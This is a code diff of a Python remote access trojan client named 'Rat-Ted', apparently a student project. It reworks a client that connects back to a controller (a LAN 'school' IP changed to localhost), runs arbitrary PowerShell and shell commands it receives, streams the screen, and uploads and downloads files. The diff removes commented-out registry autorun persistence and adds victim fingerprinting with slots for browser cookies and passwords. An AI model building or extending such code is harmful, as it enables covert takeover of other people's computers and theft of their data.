@@ -8,19 +8,17 @@ import ctypes
 import psutil
 import uuid
 from multiprocessing import Process
-import cv2
-from PIL import ImageGrab
-import numpy as np
-import pickle
-import struct
-import io
 import time
-import winreg as reg
-from modules.screenshare import ScreenShare
-from modules.filetransfer import FileTransfer
 import requests
 import sys
 import zipfile
+import json
+import getpass
+
+from modules.screenshare import ScreenShare
+from modules.fileupload import FileTransfer
+from modules.filedownload import FileDownload
+
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -35,35 +33,6 @@ FILE_SHARE_READ = 1
 FILE_SHARE_DELETE = 4
 CREATE_ALWAYS = 2
 
-# def AddToRegistry():
-
-#     # in python __file__ is the instant of
-#     # file path where it was executed
-#     # so if it was executed from desktop,
-#     # then __file__ will be
-#     # c:\users\current_user\desktop
-#     pth = os.path.dirname(os.path.realpath(__file__))
-
-#     # name of the python file with extension
-#     s_name="mYscript.py"
-
-#     # joins the file name to end of path address
-#     address=os.join(pth,s_name)
-
-#     # key we want to change is HKEY_CURRENT_USER
-#     # key value is Software\Microsoft\Windows\CurrentVersion\Run
-#     key = HKEY_CURRENT_USER
-#     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
-
-#     # open the key to make changes to
-#     open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
-
-#     # modify the opened key
-#     reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address)
-
-#     # now close the opened key
-#     reg.CloseKey(open)
-
 
 class RAT_CLIENT:
     def __init__(self, host, port):
@@ -77,20 +46,33 @@ class RAT_CLIENT:
 
         self.screenshareClient = ScreenShare()
 
-        self.file_transfer_manager = FileTransfer(
-            "192.168.98.223", 4440
+        # School ip: 192.168.98.223
+        self.file_upload_manager = FileTransfer(
+            "localhost", 4440
         )
 
         self.file_transfer_thread = Thread(
-            target=self.file_transfer_manager.connect
+            target=self.file_upload_manager.connect
         )
         self.file_transfer_thread.start()
-        # Compare this version and a the version on github.
+
+        self.file_download_manager = FileDownload(
+            "localhost", 4441
+        )
+
+        self.file_download_thread = Thread(
+            target=self.file_download_manager.connect
+        )
+        self.file_download_thread.start()
 
     def build_connection(self):
-        global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        connected = False
+        try:
+            global s
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            connected = False
+        except Exception as e:
+            print(f"Main Socket -> Error creating socket: {str(e)}")
+            time.sleep(5)  # Wait for 5 seconds before retrying
 
         while not connected:
             try:
@@ -98,14 +80,125 @@ class RAT_CLIENT:
                 s.send(self.gather_info().encode())
                 connected = True
             except Exception as e:
-                print(f"Error connecting: {str(e)}")
+                print(f"Main Socket -> Error connecting: {str(e)}")
                 time.sleep(5)  # Wait for 5 seconds before retrying
 
     def gather_info(self):
-        info = str(
-            f"System:{platform.platform()} {platform.win32_edition()}|Version: {platform.version()}|Architecture:{platform.architecture()}|Name:{platform.node()}|Processor:{platform.processor()}|Python:{platform.python_version()}|User:{os.getlogin()}|IPv4:{socket.gethostbyname(socket.gethostname())}|IPv6:{socket.gethostbyname_ex(socket.gethostname())[2][0]}|Uptime:{datetime.now() - datetime.fromtimestamp(psutil.boot_time())}|Privileges:{ctypes.windll.shell32.IsUserAnAdmin()}|Bit:{platform.machine()}|Rat-Ted-Version:1.0.0|ID:{uuid.getnode()}|Current_Directory:{os.getcwd().replace(':', 'colon')}")
+        # Switch out with actual info
+        system_info = {
+            # get ipv4 from psutil:
+            "IPv4": psutil.net_if_addrs()['Ethernet'][1].address,
+            "ComputerName": os.environ["COMPUTERNAME"],
+            "OS": platform.system(),
+            "Architecture": platform.architecture()[0],
+            "Username": getpass.getuser(),
+            "Country": "United States",  # Replace with actual country detection
+            "City": "New York",  # Replace with actual city detection
+            "Location": {
+                "Latitude": "40.7128",  # Replace with actual latitude
+                "Longitude": "-74.0060",  # Replace with actual longitude
+            },
+            "ISP": "ISP1",  # Replace with actual ISP detection
+            "Timezone": "EST",  # Replace with actual timezone detection
+            "Organization": "Org1",  # Replace with actual organization detection
+            "Postal": "12345",  # Replace with actual postal code detection
+            "ConnectionType": "Cable",  # Replace with actual connection type detection
+            "Region": "US",  # Replace with actual region detection
+            "RegionName": "New York",  # Replace with actual region name detection
+        }
 
-        return info
+        optional_info = {
+            "Microsoft Defender": "Enabled",  # Replace with actual status detection
+            "Antivirus": "AVG",  # Replace with actual antivirus detection
+            "Firewall": "Enabled",  # Replace with actual firewall status detection
+            "Uptime": str(
+                round(
+                    (psutil.boot_time() - psutil.boot_time()) / 3600,
+                    2,
+                )
+            ) + " hours",
+            "Idle Time": str(
+                round(
+                    (psutil.cpu_times().idle) / 3600,
+                    2,
+                )
+            ) + " hours",
+            "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
+            "Bit": platform.architecture()[0],
+            "Rat-Ted Version": "1.0",
+            "ComputerID": "123456",  # Replace with actual computer ID
+            "Current Directory": os.getcwd(),
+        }
+
+        client_info = {
+            "System Info": system_info,
+            "Optional Info": optional_info,
+            "Browsers": {
+                "Chrome": {
+                    "Version": "93.0.4577.82",
+                    "Cookies": [],
+                    "History": [],
+                    "Bookmarks": [],
+                    "Passwords": [],
+                    "Autofill": [],
+                    "Extensions": [],
+                    "Downloads": []
+                },
+                "Firefox": {
+                    "Version": "91.0",
+                    "Cookies": [],
+                    "History": [],
+                    "Bookmarks": [],
+                    "Passwords": [],
+                    "Autofill": [],
+                    "Extensions": [],
+                    "Downloads": []
+                },
+                # Add other browsers here
+            },
+            "Computer Hardware": {
+                "CPU": "Intel Core i7",
+                "GPU": "NVIDIA GeForce RTX 3080",
+                "RAM": "32 GB",
+                "Motherboard": "ASUS ROG Strix Z590",
+                "Storage": {
+                    "Total": "1 TB SSD",
+                    "Free": "500 GB"
+                },
+                "Audio": "Realtek HD Audio",
+                "USB Devices": [
+                    "USB Mouse",
+                    "USB Keyboard",
+                    "USB Flash Drive"
+                ]
+            },
+            "Network Info": {
+                "Network Adapter": {
+                    "Name": "Ethernet",
+                    "Status": "Connected",
+                    "Speed": "1 Gbps",
+                    "Type": "Wired"
+                },
+                "Network Speed": "100 Mbps",
+                "Network Type": "Wi-Fi",
+                "Network Status": "Connected",
+                "Network Usage": {
+                    "Upload": "1.2 MB/s",
+                    "Download": "5.3 MB/s"
+                },
+                "Network Connections": [
+                    {
+                        "IP": "192.168.1.2",
+                        "Port": 80,
+                        "Protocol": "HTTP"
+                    },
+                    # Add more connections here
+                ]
+            }
+        }
+
+        # Convert the dictionary to a string and return it
+        return json.dumps(client_info)
 
     def execute(self):
         while True:
@@ -115,6 +208,7 @@ class RAT_CLIENT:
                 command_type = command[0].split("command_type")[
                     1].replace(":", "")
                 command_cmd = command[1].split("command")[1].replace(":", "")
+
                 if command_type == "function":
                     output = self.handle_function(command_cmd)
                 elif command_type == "python":
@@ -124,20 +218,54 @@ class RAT_CLIENT:
                         shell=True,
                         text=True
                     ).strip()
-
                 else:
-                    output = subprocess.check_output(
-                        ["powershell.exe", "-Command",
-                            command_cmd],
-                        stderr=subprocess.STDOUT,
+                    # Execute PowerShell command
+                    process = subprocess.Popen(
+                        ["powershell.exe", "-Command", command_cmd],
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
+                        stdin=subprocess.PIPE,  # Open a pipe for input
                         shell=True,
                         text=True
-                    ).strip()
+                    )
+                    # Send a newline to handle input prompts
+                    out, err = process.communicate(input="\n")
+                    if process.returncode == 0:
+                        result = out.strip()
+                        error = None
+                    else:
+                        result = None
+                        error = err.strip()
+                        if not result and error:
+                            # Handle the case where there is an error message but no result
+                            result = error.strip()
+                    output = {
+                        "result": result,
+                        "error": error
+                    }
 
-            except subprocess.CalledProcessError as e:
-                output = str(e.output)
+            except Exception as e:
+                print("Error executing command:", str(e))
+                output = {
+                    "result": None,
+                    "error": str(e)
+                }
 
-            s.send(output.encode())
+            # Send the output as a JSON string
+            s.send(json.dumps(output).encode())
+
+    def extract_error_type(self, error_message):
+        # Extract the error type from the PowerShell error message
+        lines = error_message.split('\n')
+        if len(lines) > 1:
+            error_line = lines[1].strip()
+            if error_line.startswith("At line:") and "ErrorId" in error_line:
+                parts = error_line.split(":")
+                if len(parts) > 2:
+                    error_type = parts[2].strip()
+                    return error_type
+
+        return "UnknownError"  # Default to "UnknownError" if error type cannot be extracted
 
     def handle_function(self, function_name):
         if function_name == "screen_share":
@@ -204,7 +332,7 @@ class RAT_CLIENT:
 
 if __name__ == '__main__':
     # for school: 192.168.98.223
-    rat = RAT_CLIENT('192.168.98.223', 4444)
+    rat = RAT_CLIENT('localhost', 4444)
 
     while True:
         try:
